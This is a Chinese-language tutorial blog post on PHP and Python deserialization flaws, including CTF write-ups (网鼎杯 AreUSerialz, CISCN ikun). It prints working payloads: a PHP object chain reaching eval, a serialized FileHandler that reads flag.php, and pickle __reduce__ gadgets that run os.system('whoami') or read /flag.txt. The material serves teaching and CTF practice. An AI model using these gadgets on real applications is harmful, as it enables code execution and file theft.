---
title: "浅析 PHP 和 Python 反序列化漏洞分析"
slug: analysis-of-php-and-python-deserialization-vulnerability
aliases: ["/2020/analysis-of-php-and-python-deserialization-vulnerability.html"]
date: 2020-05-22 12:50:05
categories: ["网络安全"]
tags: ["PHP", "Python", "反序列化漏洞"]
toc: true
draft: false
---

首发于先知社区：<https://xz.aliyun.com/t/7751>。之前一直有接触挺多反序列化的漏洞，但是自己一直没有很细心地学习这方面的东西，所以现在花时间分析一下 php、python 中的反序列化漏洞，其大体都是差不多的，部分代码来源互联网。

> 序列化 (Serialization) 是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。

简单来说序列化就是把一个对象的数据和数据类型转成格式化字符串的过程，反序列化则是将这些格式化字符串转为对象形式的过程。因此面向对象的编程都会有概率可能存在反序列化漏洞。

## 0x01 PHP

### 魔术方法

在审计 `php 反序列化` 漏洞的时候需要着重注意几个典型的魔术方法：

| 函数          | 简介                                                                                         |
| ------------- | -------------------------------------------------------------------------------------------- |
| `__sleep` | `serialize()` 函数在执行时会检查是否存在一个 `__sleep` 魔术方法，如果存在，则先被调用           |
| `__wakeup` | `unserialize()` 函数执行时会检查是否存在一个 `__wakeup` 方法，如果存在，则先被调用             |
| `__construct` | 构造函数会在每次创建新对象时先调用                                                           |
| `__destruct` | 析构函数是 `php5` 新添加的内容，析构函数会在到对象的所有引用都被删除或者当对象被显式销毁时执行 |
| `__toString` | 当对象被当做字符串的时候会自动调用该函数                                                     |

```php
<?php
class Student{
    public $name = 'zjun';
    public $age = '19';

    public function PrintVar(){
        echo 'name '.$this -> name . ', age ' . $this -> age . '<br>';
    }
    public function __construct(){
        echo "__construct<br>";
    }
    public function __destory(){
        echo "__destory<br>";
    }
    public function __toString(){
        return "__toString";
    }
    public function __sleep(){
        echo "__sleep<br>";
        return array('name', 'age');
    }
    public function __wakeup(){
        echo "__wakeup<br>";
    }
}

$obj = new Student();
$obj -> age = 18;
$obj -> name = 'reder';
$obj -> PrintVar();
echo $obj;
$s_serialize = serialize($obj);
echo $s_serialize.'<br>';
$unseri = unserialize($s_serialize);
$unseri -> PrintVar();
?>
```

输出结果：

```html
__construct
name reder, age 18
__toString__sleep
O:7:"Student":2:{s:4:"name";s:5:"reder";s:3:"age";i:18;}
__wakeup
name reder, age 18
```

在进行构造反序列化 `payload` 时，可跟进以上几个比较典型的魔术变量进行深入挖掘。

### 一个例子

在 `php` 中，序列化和反序列化一般用做应用缓存，比如 `session` 缓存， `cookie` 等，或者是格式化数据存储，例如 `json` ， `xml` 等。

一个很简单的序列化代码，如下：

```php
<?php
    class Student{
        public $name = 'zjun';

        function GetName(){
            return 'zjun';
        }
    }
    $s = new Student();
    echo $s->GetName().'<br>';
    $s_serialize = serialize($s);
    echo $s_serialize;
```

一个 `Student` 类，其中有一个 `name` 属性和一个 `GetName` 方法，然后实例化了 `Student` 类的对象，输出调用 `GetName` 这个类方法，然后 `serialize()` 函数把对象转成字符串，也就是序列化，再输出序列化后的内容

输出结果：

```html
zjun
O:7:"Student":1:{s:4:"name";s:4:"zjun";}
```

序列化的数据详解：

`O` 是 `object` 表示对象， `:` 后边的内容为这个对象的属性， `7` 表示对象名称的长度， `Student` 就是对象名， `1` 表示对象有一个成员变量，就是 `{}` 里面的东西， `s` 表示这个成员变量是一个 `str` 字符串，他的长度为 `4` ，后面跟着成员变量名，以及这个成员变量的数据类型，长度，内容。

这里代码只有一个 `public` 属性，如果有 `protected` 或者 `private` 属性，在序列化的数据中也都会体现出来

```php
<?php
    class Student{
        public $name = 'zjun';
        protected $age = '19';
        private $weight = '53';

        function GetName(){
            return 'zjun';
        }
    }
    $s = new Student();
    echo $s->GetName().'<br>';
    $s_serialize = serialize($s);
    echo $s_serialize;
```

输出：

```html
zjun
O:7:"Student":3:{s:4:"name";s:4:"zjun";s:6:"*age";s:2:"19";s:15:"Studentweight";s:2:"53";}
```

可见 `public` 类型直接是变量名， `protected` 类型有 `*` 号，但是其长度为 `6` ，是因为 `\x00+*+\x00+ 变量名` 。同理 `private` 类型会带上对象名，其长度是 `15` ， `\x00+ 类名 +\x00+ 变量名` 。

以上的这个过程就称为 `php 序列化` ，再看看反序列化：

```php
<?php
    class Student{
        public $name = 'zjun';

        function GetName(){
            return 'zjun';
        }
    }

    $Student = 'O:7:"Student":1:{s:4:"name";s:4:"zjun";}';
    $s_unserialize = unserialize($Student);
    print_r($s_unserialize);
?>
```

`unserialize()` 函数就是用来反序列化的函数，输出：

```html
Student Object ( [name] => zjun )
```

一个 `Student` 对象，其中 `name` 成员变量等于 `zjun` ，这就是反序列化，将格式化字符串转化为对象。

在这个过程中本来是挺正常的，在一些特殊情景下却能造成如 `rce` 等漏洞，如

```php
<?php
class Student{
    var $a;
    function __construct() {
        echo '__construct';
    }
    function __destruct() {
        $this->a->action();
        echo 'one';
    }
}

class one {
    var $b;
    function action() {
        eval($this->b);
    }
}
$c = new Student();
unserialize($_GET['a']);
?>
```

代码有一个构造函数 `__construct` 输出 `__construct` ，在 `new` 这个对象时自动调用，一个析构函数 `__destruct` 将当我们传入的 `a` 再传进 `one` 对象中执行，构造代码：

```php
<?php
class Student {
    var $a;
    function __construct() {
        $this->a = new one();
    }
}
class one {
    var $b = "phpinfo();";
}
echo serialize(new Student());
?>
```

输出：

```php
O:7:"Student":1:{s:1:"a";O:3:"one":1:{s:1:"b";s:10:"phpinfo();";}}
```

![deserialization-1](https://oss.zjun.info/zjun.info/deserialization-1.png)

成功触发。

### 实例：网鼎杯 2020 青龙组 AreUSerialz

```php
<?php
include("flag.php");
highlight_file(__FILE__);

class FileHandler {
    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }
}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {
    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }
}
```

这里需要读 `flag.php` 文件，在 `process()` 函数中，当 `op=2` 时， `read()` 中的 `file_get_contents` 就会执行， `is_valid()` 会判断传入的字符串是否为可打印字符，而原来的类修饰均为 `protected` ，在序列化时会生成不可见的 `\x00` ，但 `php7+` 对类的属性类型不敏感，可直接把属性修饰为 `public` ，成功绕过 `is_valid()` 。

构造

```php
<?php
class FileHandler {

    public $op = 2;
    public $filename = "flag.php";
    public $content;
}

$a = new FileHandler();
echo serialize($a)."\n";
```

传入

```bash
?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}
```

![deserialization-2](https://oss.zjun.info/zjun.info/deserialization-2.png)

## 0x02 PYTHON

`python` 中序列化一般有两种方式： `pickle` 模块和 `json` 模块，前者是 `python` 特有的格式，后者是 `json` 通用的格式。

以下均显示为 `python2` 版本序列化输出结果， `python3` 的 `pickle.dumps` 结果与 `python2` 不一样。

<font color=red>**pickle**</font>

```python
import pickle

dict = {"name": 'zjun', "age": 19}
a = pickle.dumps(dict)
print(a, type(a))
b = pickle.loads(a)
print(b, type(b))
```

输出：

```bash
("(dp0\nS'age'\np1\nI19\nsS'name'\np2\nS'zjun'\np3\ns.", <type 'str'>)
({'age': 19, 'name': 'zjun'}, <type 'dict'>)
```

<font color=red>**json**</font>

```python
import json
dict = {"name": 'zjun', "age": 19}
a = json.dumps(dict, indent=4)
print(a, type(a))
b = json.loads(a)
print(b, type(b))
```

其中 `indent=4` 起到一个数据格式化输出的效果，当数据多了就显得更为直观，输出：

```bash
{
    "name": "zjun",
    "age": 19
} <class 'str'>
{'name': 'zjun', 'age': 19} <class 'dict'>
```

再看看一个 `pickle` 模块导致的安全问题

```python
import pickle
import os

class obj(object):
    def __reduce__(self):
        a = 'whoami'
        return (os.system, (a, ))

r = pickle.dumps(obj())
print(r)
pickle.loads(r)
```

通过构造 `__reduce__` 可达到命令执行的目的，详见：[Python 魔法方法指南](https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html)

![deserialization-3](https://oss.zjun.info/zjun.info/deserialization-3.webp)

先输出 `obj` 对象的序列化结果，再将其反序列化，输出

```bash
cposix
system
p0
(S'whoami'
p1
tp2
Rp3
.
zjun
```

成功执行了 `whoami` 命令。

### 实例：CISCN2019 华北赛区 Day1 Web2 ikun

[CISCN2019 华北赛区 Day1 Web2 ikun](https://blog.zjun.info/2019/ikun.html)，前面的细节讲得很清楚了，这里接着看反序列化的考点。

![deserialization-4](https://oss.zjun.info/zjun.info/deserialization-4.png)

第 `19` 行处直接接收 `become` 经 `url` 解码与其反序列化的内容，存在反序列化漏洞，构造 `payload` 读取 `flag.txt` 文件：

```python
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print(a)
```

```bash
c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
```

将生成的 `payload` 传给 `become` 即可。

再推荐一下 P 牛的[python 反序列化漏洞挖掘](https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html)。
